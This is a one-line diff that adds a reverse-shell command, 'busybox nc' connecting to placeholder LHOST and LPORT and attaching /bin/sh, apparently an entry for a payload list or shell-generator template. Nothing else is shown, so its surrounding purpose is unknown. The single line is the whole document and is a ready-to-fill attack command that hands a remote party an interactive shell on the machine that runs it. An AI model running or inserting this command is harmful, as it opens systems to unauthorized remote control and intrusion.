@@ -1,0 +1,1 @@
+busybox nc {LHOST} {LPORT} -e /bin/sh
